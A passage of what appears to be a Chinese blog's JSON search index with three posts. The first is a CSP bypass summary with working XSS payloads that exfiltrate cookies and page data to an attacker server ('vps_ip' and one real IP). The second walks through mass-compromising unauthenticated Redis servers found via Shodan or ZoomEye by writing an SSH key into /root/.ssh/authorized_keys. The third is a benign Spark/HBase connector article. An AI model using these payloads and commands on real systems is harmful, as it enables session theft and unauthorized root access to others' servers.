只要等它安装完就够了。","categories":[],"tags":[]},{"title":"我的CSP绕过思路及总结","slug":"我的CSP绕过思路及总结","date":"2019-05-11T00:38:05.000Z","updated":"2019-05-11T04:53:29.889Z","comments":true,"path":"2019/05/11/我的CSP绕过思路及总结/","link":"","permalink":"https://www.5658.pw/2019/05/11/我的CSP绕过思路及总结/","excerpt":"CSP简介内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。CSP的具体介绍可以看看手册内容安全策略","text":"CSP简介内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。CSP的具体介绍可以看看手册内容安全策略 CSP的绕过CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充 location.hrefCSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上 1location.href = &quot;vps_ip:xxxx?&quot;+document.cookie 有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333利用条件: 可以执行任意JS脚本，但是由于CSP无法数据带外 link标签导致的绕过这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。所以我们可以通过此标签将数据带外 12345&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt; 当然这个是我们写死的标签，如何把数据带外？ 1234var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link); 这样就可以把cookie带外了利用条件: 可以执行任意JS脚本，但是由于CSP无法数据带外 使用Iframe绕过当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效A页面: 1234&lt;!-- A页面 --&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;&lt;h1 id=&quot;flag&quot;&gt;flag&#123;0xffff&#125;&lt;/h1&gt; B页面: 1234567891011&lt;!-- B页面 --&gt;&lt;!-- 下面模拟XSS --&gt;&lt;body&gt;&lt;script&gt;var iframe = document.createElement(&apos;iframe&apos;);iframe.src=&quot;A页面&quot;;document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;flag&apos;).innerHTML),1000);&lt;/script&gt;&lt;/body&gt; setTimeout是为了等待iframe加载完成利用条件: 一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞 我们需要的数据在存在CSP保护的页面 用CDN来绕过一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险这里给出orange师傅绕hackmd CSP的文章Hackmd XSS案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下 1234567&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt; &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;&lt;/div&gt; 这个是存在低版本angular js的cdn服务商列表https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76除了低版本angular js的模板注入，还有许多库可以绕过CSP下面引用https://www.jianshu.com/p/f1de775bc43e如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp 1&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt; 还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie 1&lt;amp-pixel src=&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt; blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf利用条件: CDN服务商存在某些低版本的js库 此CDN服务商在CSP白名单中 站点可控静态资源绕过给一个绕过codimd的(实例)codimd xss案例中codimd的CSP中使用了www.google-analytics.com而www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP 12&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; 同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过利用条件: 站点存在可控静态资源 站点在CSP白名单中 站点可控JSONP绕过JSONP的详细介绍可以看看我之前的一篇文章https://xz.aliyun.com/t/4470大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析以ins’hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了www.google.com 1Content-Security-Policy: script-src www.google.com; img-src *; default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos; 看上去非常天衣无缝，但是google站点存在了用户可控jsonp 123&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src https://www.google.com&quot;&gt;&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt; 配合注释符，我们即可执行任意js下面是一些存在用户可控资源或者jsonp比较常用站点的github项目https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180利用条件: 站点存在可控Jsonp 站点在CSP白名单中 Base-uri绕过第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解&lt;https://blog.cal1.cn/post/RCTF 2018 rBlog writeup&gt;当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用&lt;base&gt;标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径exp 123&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;&lt;base href=&quot;//vps_ip/&quot;&gt;&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt; 注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内 利用条件: script-src只使用nonce 没有额外设置base-uri 页面引用存在相对路径的&lt;script&gt;标签 不完整script标签绕过nonce考虑下下列场景，如果存在这样场景，该怎么绕过CSP 123456&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-xxxxx&apos;&quot;&gt;&lt;?php echo $_GET[&apos;xss&apos;]?&gt;&lt;script nonce=&apos;xxxxx&apos;&gt; //do some thing&lt;/script&gt; 如果我们输入 http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 即可xss这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的&lt;script会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src 但是在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略 12&lt;!-- 3.php --&gt;&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt; 于是我们可以输入 http://127.0.0.1/2.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样exp就能成功在chrome浏览器上执行 利用条件: 可控点在合法script标签上方,且其中没有其他标签 XSS页面的CSP script-src只采用了nonce方式 object-src绕过（PDFXSS）假如只有这一个页面，我们能有办法执行JS吗 12&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;&quot;&gt;&lt;?php echo $_GET[&apos;xss&apos;]?&gt; 在CSP标准里面，有一个属性是object-src，它限制的是 标签的src，也就是插件的src于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本 1&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/123.pdf&quot;&gt;&lt;/embed&gt; 当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等具体可以看看这篇文章https://blog.csdn.net/microzone/article/details/52850623里面有上面实例用的恶意pdf文件 当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件 利用条件: 没有设置object-src，或者object-src没有设置为’none’ pdf用的是chrome的默认解析器 SVG绕过SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss 之前的easer CONFidence CTF就出过svg的xss引用 https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/1.svg 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt; &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot; href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt; 利用条件: 可以上传svg图片 不完整的资源标签获取资源看看下面的例子，我们如何把flag给带出来 1234&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;; img-src *;&quot;&gt;&lt;?php echo $_GET[&apos;xss&apos;]?&gt;&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt; 这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的&lt;img标签来将数据带出 exp: http://127.0.0.1/2.php?xss=&lt;img src=&quot;//VPS_IP?a=此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;，否者不会发出利用条件: 可以加载外域资源 (img-src: *) 需要获取页面某处的信息 不好总结，看上面例子，懂意思就行 CSS选择器获取内容这个来自2018 SECCON CTF的一道题，虽然原题中不是用来绕csp，但是也能拿过来利用，当然利用条件比较苛刻，需要设置style-src为*，或者只设置了script-src原题可以看看这篇文章https://www.yourhome.ren/index.php/sec/608.html大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注 12//这里引用的是上面文章中的expinput[value^=&quot;6703&quot;] &#123;background-image:url(&quot;http://vps_ip/?6703&quot;);&#125; 这句话的意思是，当input的value值已6703开头，则去加载后面的url，于是我们可以一位一位爆破，先猜第一位，再猜第二位。。。 123&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;; style-src &apos;unsafe-inline&apos;;img-src *&quot;&gt;&lt;?php echo $_GET[&apos;xss&apos;]?&gt;&lt;input value=&quot;flag&#123;0xffff&#125;&quot;&gt; exp: http://127.0.0.1/1.php?xss=&lt;style&gt;input[value^=&quot;flag{0xffff}&quot;] {background-image:url(&quot;http://47.106.65.216:1002/?flag{0xffff}&quot;)}%3C/style%3E太苛刻了，之前想到随便提一下好了利用条件:(好苛刻啊都不想写了) style允许内敛，img可以跨域 需要获取的数据在页面内 可以新建标签 可以多次发送xss且获取的数据不会变（毕竟不可能一次请求就注出来，除非能执行js写脚本一口气注） CRLF绕过HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP原题github https://github.com/Lou00/HCTF2018_Bottle 这个原理比较简单，就不写条件了","categories":[{"name":"安全技术","slug":"安全技术","permalink":"https://www.5658.pw/categories/安全技术/"},{"name":"WEB安全","slug":"安全技术/WEB安全","permalink":"https://www.5658.pw/categories/安全技术/WEB安全/"}],"tags":[{"name":"CSP","slug":"CSP","permalink":"https://www.5658.pw/tags/CSP/"},{"name":"CDN","slug":"CDN","permalink":"https://www.5658.pw/tags/CDN/"},{"name":"SVF","slug":"SVF","permalink":"https://www.5658.pw/tags/SVF/"},{"name":"CRLF","slug":"CRLF","permalink":"https://www.5658.pw/tags/CRLF/"},{"name":"JSONP","slug":"JSONP","permalink":"https://www.5658.pw/tags/JSONP/"}]},{"title":"Redis批量getshell的方法","slug":"Redis批量getshell的方法","date":"2019-04-03T03:18:56.000Z","updated":"2019-05-11T03:44:18.128Z","comments":true,"path":"2019/04/03/Redis批量getshell的方法/","link":"","permalink":"https://www.5658.pw/2019/04/03/Redis批量getshell的方法/","excerpt":"快速获取一天linux服务器权限的方法之一 0x1 什么是Redis ​ Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。","text":"快速获取一天linux服务器权限的方法之一 0x1 什么是Redis ​ Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。 0x2 Redis未授权访问 ​ Redis因配置不当导致未授权访问，被黑客恶意利用。目前针对Redis未授权访问的攻击已成一种新型流行攻击方式，多见于获取服务器权限后进行挖矿（继比特币又火了一把之后，各种币热火朝天比如门罗币、零币等）。 ​ 如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。 0x2 Redis主机批量采集 ​ 批量获取存在Redis未授权访问的服务器方法我通常用以下方法： 1.Zoomeyes、shodan、fofa等网络空间搜索引擎 2.使用S扫描器扫描指定B、C段开放了默认端口的IP 3.使用nmap+redis script扫描IP段 ​ 其实不管使用哪种方法想要达到批量的目的，无外乎获取大量开放Redis服务的主机后批量进行验证。之前使用的最快的方法是使用cdxy写的POC-T开源测试框架（https://github.com/Xyntax/POC-T）。自带的有关于Redis利用插件： 配置Zoomeye的登录配置文件，根据搜索参数进行获取开放Redis服务的主机： 另外一个值得说的插件是可验证是否能够修改.ssh目录下的authorized_keys文件，代码细节： 将Zoomeye或S扫描器获取存在未授权访问的IP导入过滤即可： 在本地生成公钥： 123ssh-keygen -t rsa将公钥写入文件并使用redis-cli导入缓存：echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txtcat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx 指定Redis服务器的备份目录及文件: 1config set dir /root/.ssh config set dbfilename authorized_keys save 使用ssh客户端连接：","categories":[{"name":"技术资源","slug":"技术资源","permalink":"https://www.5658.pw/categories/技术资源/"},{"name":"渗透测试","slug":"技术资源/渗透测试","permalink":"https://www.5658.pw/categories/技术资源/渗透测试/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/tags/Linux/"},{"name":"Redis","slug":"Redis","permalink":"https://www.5658.pw/tags/Redis/"},{"name":"GetShell","slug":"GetShell","permalink":"https://www.5658.pw/tags/GetShell/"}]},{"title":"SHC：使用 Spark SQL 高效地读写 HBase","slug":"SHC：使用-Spark-SQL-高效地读写-HBase","date":"2019-04-02T03:46:56.000Z","updated":"2019-05-11T04:24:04.525Z","comments":true,"path":"2019/04/02/SHC：使用-Spark-SQL-高效地读写-HBase/","link":"","permalink":"https://www.5658.pw/2019/04/02/SHC：使用-Spark-SQL-高效地读写-HBase/","excerpt":"Apache Spark 和 Apache HBase 是两个使用比较广泛的大数据组件。很多场景需要使用 Spark 分析/查询 HBase 中的数据，而目前 Spark 内置是支持很多数据源的，其中就包括了 HBase，但是内置的读取数据源还是使用了 TableInputFormat 来读取 HBase 中的数据。这个 TableInputFormat 有一些缺点： 一个 Task 里面只能启动一个 Scan 去 HBase 中读取数据； TableInputFormat 中不支持 BulkGet； 不能享受到 Spark SQL 内置的 catalyst 引擎的优化。 基于这些问题，来自 Hortonworks 的工程师们为我们带来了全新的 Apache Spark—Apache HBase Connector，下面简称 SHC。通过这个类库，我们可以直接使用 Spark SQL 将 DataFrame 中的数据写入到 HBase 中；而且我们也可以使用 Spark SQL 去查询 HBase 中的数据，在查询 HBase 的时候充分利用了 catalyst 引擎做了许多优化，比如分区修剪（partition pruning），列修剪（column pruning），谓词下推（predicate pushdown）和数据本地性（data locality）等等。因为有了这些优化，通过 Spark 查询 HBase 的速度有了很大的提升。","text":"Apache Spark 和 Apache HBase 是两个使用比较广泛的大数据组件。很多场景需要使用 Spark 分析/查询 HBase 中的数据，而目前 Spark 内置是支持很多数据源的，其中就包括了 HBase，但是内置的读取数据源还是使用了 TableInputFormat 来读取 HBase 中的数据。这个 TableInputFormat 有一些缺点： 一个 Task 里面只能启动一个 Scan 去 HBase 中读取数据； TableInputFormat 中不支持 BulkGet； 不能享受到 Spark SQL 内置的 catalyst 引擎的优化。 基于这些问题，来自 Hortonworks 的工程师们为我们带来了全新的 Apache Spark—Apache HBase Connector，下面简称 SHC。通过这个类库，我们可以直接使用 Spark SQL 将 DataFrame 中的数据写入到 HBase 中；而且我们也可以使用 Spark SQL 去查询 HBase 中的数据，在查询 HBase 的时候充分利用了 catalyst 引擎做了许多优化，比如分区修剪（partition pruning），列修剪（column pruning），谓词下推（predicate pushdown）和数据本地性（data locality）等等。因为有了这些优化，通过 Spark 查询 HBase 的速度有了很大的提升。 注意：SHC 同时还提供了将 DataFrame 中的数据直接写入到 HBase 中，但是整个代码并没有什么优化的地方，所以本文对这部分不进行介绍。感兴趣的读者可以直接到这里查看相关写数据到 HBase 的代码。 文章目录 1 SHC 是如何实现查询优化的呢 1.1 将使用 Rowkey 的查询转换成 get 查询 2 组合 RowKey 的查询优化 3 scan 查询优化 SHC 是如何实现查询优化的呢SHC 主要使用下面的几种优化，使得 Spark 获取 HBase 的数据扫描范围得到减少，提高了数据读取的效率。 将使用 Rowkey 的查询转换成 get 查询我们都知道，HBase 中使用 Get 查询的效率是非常高的，所以如果查询的过滤条件是针对 RowKey 进行的，那么我们可以将它转换成 Get 查询。为了说明这点，我们使用下面的例子进行说明。假设我们定义好的 HBase catalog 如下： 1`val` `catalog ``=` `s``&quot;&quot;``&quot;&#123;`` ``|&quot;``table``&quot;:&#123;&quot;``namespace``&quot;:&quot;``default``&quot;, &quot;``name``&quot;:&quot;``iteblog``&quot;, &quot;``tableCoder``&quot;:&quot;``PrimitiveType``&quot;&#125;,`` ``|&quot;``rowkey``&quot;:&quot;``key``&quot;,`` ``|&quot;``columns``&quot;:&#123;`` ``|&quot;``col``0``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``id``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,`` ``|&quot;``col``1``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``1``&quot;, &quot;``col``&quot;:&quot;``col``1``&quot;, &quot;``type``&quot;:&quot;``boolean``&quot;&#125;,`` ``|&quot;``col``2``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``2``&quot;, &quot;``col``&quot;:&quot;``col``2``&quot;, &quot;``type``&quot;:&quot;``double``&quot;&#125;,`` ``|&quot;``col``3``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``3``&quot;, &quot;``col``&quot;:&quot;``col``3``&quot;, &quot;``type``&quot;:&quot;``float``&quot;&#125;,`` ``|&quot;``col``4``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``4``&quot;, &quot;``col``&quot;:&quot;``col``4``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,`` ``|&quot;``col``5``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``5``&quot;, &quot;``col``&quot;:&quot;``col``5``&quot;, &quot;``type``&quot;:&quot;``bigint``&quot;&#125;,`` ``|&quot;``col``6``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``6``&quot;, &quot;``col``&quot;:&quot;``col``6``&quot;, &quot;``type``&quot;:&quot;``smallint``&quot;&#125;,`` ``|&quot;``col``7``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``7``&quot;, &quot;``col``&quot;:&quot;``col``7``&quot;, &quot;``type``&quot;:&quot;``string``&quot;&#125;,`` ``|&quot;``col``8``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``8``&quot;, &quot;``col``&quot;:&quot;``col``8``&quot;, &quot;``type``&quot;:&quot;``tinyint``&quot;&#125;`` ``|&#125;``|&#125;&quot;``&quot;&quot;``.stripMargin` 那么如果有类似下面的查询 1`val` `df ``=` `withCatalog(catalog)``df.createOrReplaceTempView(``&quot;iteblog_table&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id = 1&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id = 1 or id = 2&quot;``)``sqlContext.sql(``&quot;select * from iteblog_table where id in (1, 2)&quot;``)` 因为查询条件直接是针对 RowKey 进行的，所以这种情况直接可以转换成 Get 或者 BulkGet 请求的。第一个 SQL 查询过程类似于下面过程 如果想及时了解Spark、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：iteblog_hadoop 后面两条 SQL 查询其实是等效的，在实现上会把 key in (x1, x2, x3..) 转换成 (key == x1) or (key == x2) or ... 的。整个查询流程如下： 如果想及时了解Spark、Hadoop或者Hbase相关的文章，欢迎关注微信公共帐号：iteblog_hadoop 如果我们的查询里面有 Rowkey 还有其他列的过滤，比如下面的例子 1`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 and col7 = &apos;xxx&apos;&quot;``)` 那么上面的 SQL 翻译成 HBase 的下面查询 1`val` `filter ``=` `new` `SingleColumnValueFilter(`` ``Bytes.toBytes(``&quot;cf7&quot;``), Bytes.toBytes(``&quot;col7 &quot;``)`` ``CompareOp.EQUAL,`` ``Bytes.toBytes(``&quot;xxx&quot;``))` `val` `g ``=` `new` `Get(Bytes.toBytes(``1``))``g.addColumn(Bytes.toBytes(``&quot;cf6&quot;``), Bytes.toBytes(``&quot;col6&quot;``))``g.addColumn(Bytes.toBytes(``&quot;cf8&quot;``), Bytes.toBytes(``&quot;col8&quot;``))``g.setFilter(filter)` 如果有多个 and 条件，都是使用 SingleColumnValueFilter 进行过滤的，这个都好理解。如果我们有下面的查询 1`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 = &apos;xxx&apos;&quot;``)` 那么在 shc 里面是怎么进行的呢？事实上，如果碰到非 RowKey 的过滤，那么这种查询是需要扫描 HBase 的全表的。上面的查询在 shc 里面就是将 HBase 里面的所有数据拿到，然后传输到 Spark ，再通过 Spark 里面进行过滤，可见 shc 在这种情况下效率是很低下的。 注意，上面的查询在 shc 返回的结果是错误的。具体原因是在将 id = 1 or col7 = ‘xxx’ 查询条件进行合并时，丢弃了所有的查找条件，相当于返回表的所有数据。定位到代码可以参见下面的 1`def` `or[T](left``:` `HRF[T],`` ``right``:` `HRF[T])(``implicit` `ordering``:` `Ordering[T])``:` `HRF[T] ``=` `&#123;`` ``val` `ranges ``=` `ScanRange.or(left.ranges, right.ranges)`` ``val` `typeFilter ``=` `TypedFilter.or(left.tf, right.tf)`` ``HRF(ranges, typeFilter, left.handled &amp;&amp; right.handled)``&#125;` 同理，类似于下面的查询在 shc 里面其实都是全表扫描，并且将所有的数据返回到 Spark 层面上再进行一次过滤。 1`sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 &lt;= &apos;xxx&apos;&quot;``)``sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where id = 1 or col7 &gt;= &apos;xxx&apos;&quot;``)``sqlContext.sql(``&quot;select id, col6, col8 from iteblog_table where col7 = &apos;xxx&apos;&quot;``)` 很显然，这种方式查询效率并不高，一种可行的方案是将算子下推到 HBase 层面，在 HBase 层面通过 SingleColumnValueFilter 过滤一部分数据，然后再返回到 Spark，这样可以节省很多数据的传输。 组合 RowKey 的查询优化shc 还支持组合 RowKey 的方式来建表，具体如下： 1`def` `cat ``=`` ``s``&quot;&quot;``&quot;&#123;`` ``|&quot;``table``&quot;:&#123;&quot;``namespace``&quot;:&quot;``default``&quot;, &quot;``name``&quot;:&quot;``iteblog``&quot;, &quot;``tableCoder``&quot;:&quot;``PrimitiveType``&quot;&#125;,`` ``|&quot;``rowkey``&quot;:&quot;``key``1``:``key``2``&quot;,`` ``|&quot;``columns``&quot;:&#123;`` ``|&quot;``col``00``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``key``1``&quot;, &quot;``type``&quot;:&quot;``string``&quot;, &quot;``length``&quot;:&quot;``6``&quot;&#125;,`` ``|&quot;``col``01``&quot;:&#123;&quot;``cf``&quot;:&quot;``rowkey``&quot;, &quot;``col``&quot;:&quot;``key``2``&quot;, &quot;``type``&quot;:&quot;``int``&quot;&#125;,`` ``|&quot;``col``1``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``1``&quot;, &quot;``col``&quot;:&quot;``col``1``&quot;, &quot;``type``&quot;:&quot;``boolean``&quot;&#125;,`` ``|&quot;``col``2``&quot;:&#123;&quot;``cf``&quot;:&quot;``cf``2``&quot;, &quot;``col``&quot;:&quot;``col``2``&quot;, 